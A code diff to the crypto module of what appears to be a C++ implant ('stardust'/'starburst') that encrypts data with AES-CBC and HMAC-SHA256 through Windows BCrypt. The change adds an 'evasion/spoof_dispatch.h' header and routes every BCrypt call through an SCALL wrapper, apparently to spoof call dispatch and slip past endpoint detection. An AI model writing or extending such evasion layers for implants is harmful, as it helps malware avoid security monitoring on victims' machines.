@@ -1,6 +1,7 @@
 #include <common.h>
 #include <crypto.h>
 #include <base64.h>
+#include <evasion/spoof_dispatch.h>
 
 using namespace stardust;
 
@@ -21,7 +22,7 @@ auto declfn starburst::crypto_init(
         return false;
     }
 
-    status = inst.bcrypt_mod.BCryptOpenAlgorithmProvider(
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptOpenAlgorithmProvider,
         &inst.crypto.h_aes,
         symbol<LPCWSTR>( L"AES" ),
         nullptr,
@@ -30,7 +31,7 @@ auto declfn starburst::crypto_init(
     DBG_PRINT( inst, "crypto_init: AES provider status=0x%08X\n", status );
     if ( status != 0 ) return false;
 
-    status = inst.bcrypt_mod.BCryptSetProperty(
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptSetProperty,
         inst.crypto.h_aes,
         symbol<LPCWSTR>( L"ChainingMode" ),
         reinterpret_cast<PUCHAR>( symbol<LPWSTR>( const_cast<wchar_t*>( L"ChainingModeCBC" ) ) ),
@@ -40,7 +41,7 @@ auto declfn starburst::crypto_init(
     DBG_PRINT( inst, "crypto_init: SetProperty status=0x%08X\n", status );
     if ( status != 0 ) return false;
 
-    status = inst.bcrypt_mod.BCryptOpenAlgorithmProvider(
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptOpenAlgorithmProvider,
         &inst.crypto.h_sha256,
         symbol<LPCWSTR>( L"SHA256" ),
         nullptr,
@@ -66,12 +67,12 @@ auto declfn starburst::crypto_encrypt(
     uint8_t iv[AES_BLOCK_SIZE];
     uint8_t iv_copy[AES_BLOCK_SIZE];
 
-    status = inst.bcrypt_mod.BCryptGenRandom( nullptr, iv, AES_BLOCK_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptGenRandom, nullptr, iv, AES_BLOCK_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
     if ( status != 0 ) return false;
 
     memory::copy( iv_copy, iv, AES_BLOCK_SIZE );
 
-    status = inst.bcrypt_mod.BCryptGenerateSymmetricKey(
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptGenerateSymmetricKey,
         inst.crypto.h_aes, &h_key, nullptr, 0,
         key, AES_KEY_SIZE, 0
     );
@@ -80,7 +81,7 @@ auto declfn starburst::crypto_encrypt(
     uint32_t padded_len = ((plain_len / AES_BLOCK_SIZE) + 1) * AES_BLOCK_SIZE;
 
     auto padded = static_cast<uint8_t*>( inst.heap_alloc( padded_len ) );
-    if ( !padded ) { inst.bcrypt_mod.BCryptDestroyKey( h_key ); return false; }
+    if ( !padded ) { SCALL( inst, bcrypt_mod.BCryptDestroyKey, h_key ); return false; }
 
     memory::copy( padded, plaintext, plain_len );
     uint8_t pad_val = padded_len - plain_len;
@@ -89,34 +90,34 @@ auto declfn starburst::crypto_encrypt(
     }
 
     ULONG cipher_len = 0;
-    status = inst.bcrypt_mod.BCryptEncrypt(
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptEncrypt,
         h_key, padded, padded_len,
         nullptr, iv_copy, AES_BLOCK_SIZE,
         nullptr, 0, &cipher_len, 0
     );
     if ( status != 0 ) {
         inst.heap_free( padded );
-        inst.bcrypt_mod.BCryptDestroyKey( h_key );
+        SCALL( inst, bcrypt_mod.BCryptDestroyKey, h_key );
         return false;
     }
 
     auto cipher = static_cast<uint8_t*>( inst.heap_alloc( cipher_len ) );
     if ( !cipher ) {
         inst.heap_free( padded );
-        inst.bcrypt_mod.BCryptDestroyKey( h_key );
+        SCALL( inst, bcrypt_mod.BCryptDestroyKey, h_key );
         return false;
     }
 
     memory::copy( iv_copy, iv, AES_BLOCK_SIZE );
 
-    status = inst.bcrypt_mod.BCryptEncrypt(
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptEncrypt,
         h_key, padded, padded_len,
         nullptr, iv_copy, AES_BLOCK_SIZE,
         cipher, cipher_len, &cipher_len, 0
     );
 
     inst.heap_free( padded );
-    inst.bcrypt_mod.BCryptDestroyKey( h_key );
+    SCALL( inst, bcrypt_mod.BCryptDestroyKey, h_key );
 
     if ( status != 0 ) {
         inst.heap_free( cipher );
@@ -125,7 +126,7 @@ auto declfn starburst::crypto_encrypt(
 
     // HMAC-SHA256 over IV + ciphertext
     BCRYPT_HASH_HANDLE h_hmac = nullptr;
-    status = inst.bcrypt_mod.BCryptCreateHash(
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptCreateHash,
         inst.crypto.h_sha256, &h_hmac,
         nullptr, 0, key, AES_KEY_SIZE, 0
     );
@@ -134,12 +135,12 @@ auto declfn starburst::crypto_encrypt(
         return false;
     }
 
-    inst.bcrypt_mod.BCryptHashData( h_hmac, iv, AES_BLOCK_SIZE, 0 );
-    inst.bcrypt_mod.BCryptHashData( h_hmac, cipher, cipher_len, 0 );
+    SCALL( inst, bcrypt_mod.BCryptHashData, h_hmac, iv, AES_BLOCK_SIZE, 0 );
+    SCALL( inst, bcrypt_mod.BCryptHashData, h_hmac, cipher, cipher_len, 0 );
 
     uint8_t hmac[SHA256_SIZE];
-    inst.bcrypt_mod.BCryptFinishHash( h_hmac, hmac, SHA256_SIZE, 0 );
-    inst.bcrypt_mod.BCryptDestroyHash( h_hmac );
+    SCALL( inst, bcrypt_mod.BCryptFinishHash, h_hmac, hmac, SHA256_SIZE, 0 );
+    SCALL( inst, bcrypt_mod.BCryptDestroyHash, h_hmac );
 
     // output = IV (16) + ciphertext + HMAC (32)
     uint32_t total_len = AES_BLOCK_SIZE + cipher_len + SHA256_SIZE;
@@ -178,18 +179,18 @@ auto declfn starburst::crypto_decrypt(
 
     // verify HMAC
     BCRYPT_HASH_HANDLE h_hmac = nullptr;
-    NTSTATUS status = inst.bcrypt_mod.BCryptCreateHash(
+    NTSTATUS status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptCreateHash,
         inst.crypto.h_sha256, &h_hmac,
         nullptr, 0, key, AES_KEY_SIZE, 0
     );
     if ( status != 0 ) return false;
 
-    inst.bcrypt_mod.BCryptHashData( h_hmac, iv_ptr, AES_BLOCK_SIZE, 0 );
-    inst.bcrypt_mod.BCryptHashData( h_hmac, cipher_ptr, cipher_len, 0 );
+    SCALL( inst, bcrypt_mod.BCryptHashData, h_hmac, iv_ptr, AES_BLOCK_SIZE, 0 );
+    SCALL( inst, bcrypt_mod.BCryptHashData, h_hmac, cipher_ptr, cipher_len, 0 );
 
     uint8_t computed_hmac[SHA256_SIZE];
-    inst.bcrypt_mod.BCryptFinishHash( h_hmac, computed_hmac, SHA256_SIZE, 0 );
-    inst.bcrypt_mod.BCryptDestroyHash( h_hmac );
+    SCALL( inst, bcrypt_mod.BCryptFinishHash, h_hmac, computed_hmac, SHA256_SIZE, 0 );
+    SCALL( inst, bcrypt_mod.BCryptDestroyHash, h_hmac );
 
     if ( memory::compare( computed_hmac, hmac_ptr, SHA256_SIZE ) != 0 ) return false;
 
@@ -198,38 +199,38 @@ auto declfn starburst::crypto_decrypt(
     memory::copy( iv_copy, iv_ptr, AES_BLOCK_SIZE );
 
     BCRYPT_KEY_HANDLE h_key = nullptr;
-    status = inst.bcrypt_mod.BCryptGenerateSymmetricKey(
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptGenerateSymmetricKey,
         inst.crypto.h_aes, &h_key, nullptr, 0,
         key, AES_KEY_SIZE, 0
     );
     if ( status != 0 ) return false;
 
     ULONG plain_len = 0;
-    status = inst.bcrypt_mod.BCryptDecrypt(
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptDecrypt,
         h_key, cipher_ptr, cipher_len,
         nullptr, iv_copy, AES_BLOCK_SIZE,
         nullptr, 0, &plain_len, 0
     );
     if ( status != 0 ) {
-        inst.bcrypt_mod.BCryptDestroyKey( h_key );
+        SCALL( inst, bcrypt_mod.BCryptDestroyKey, h_key );
         return false;
     }
 
     auto plain = static_cast<uint8_t*>( inst.heap_alloc( plain_len ) );
     if ( !plain ) {
-        inst.bcrypt_mod.BCryptDestroyKey( h_key );
+        SCALL( inst, bcrypt_mod.BCryptDestroyKey, h_key );
         return false;
     }
 
     memory::copy( iv_copy, iv_ptr, AES_BLOCK_SIZE );
 
-    status = inst.bcrypt_mod.BCryptDecrypt(
+    status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptDecrypt,
         h_key, cipher_ptr, cipher_len,
         nullptr, iv_copy, AES_BLOCK_SIZE,
         plain, plain_len, &plain_len, 0
     );
 
-    inst.bcrypt_mod.BCryptDestroyKey( h_key );
+    SCALL( inst, bcrypt_mod.BCryptDestroyKey, h_key );
 
     if ( status != 0 ) {
         inst.heap_free( plain );
@@ -252,11 +253,11 @@ auto declfn starburst::crypto_destroy(
     _Inout_ instance& inst
 ) -> void {
     if ( inst.crypto.h_aes ) {
-        inst.bcrypt_mod.BCryptCloseAlgorithmProvider( inst.crypto.h_aes, 0 );
+        SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, inst.crypto.h_aes, 0 );
         inst.crypto.h_aes = nullptr;
     }
     if ( inst.crypto.h_sha256 ) {
-        inst.bcrypt_mod.BCryptCloseAlgorithmProvider( inst.crypto.h_sha256, 0 );
+        SCALL( inst, bcrypt_mod.BCryptCloseAlgorithmProvider, inst.crypto.h_sha256, 0 );
         inst.crypto.h_sha256 = nullptr;
     }
 }
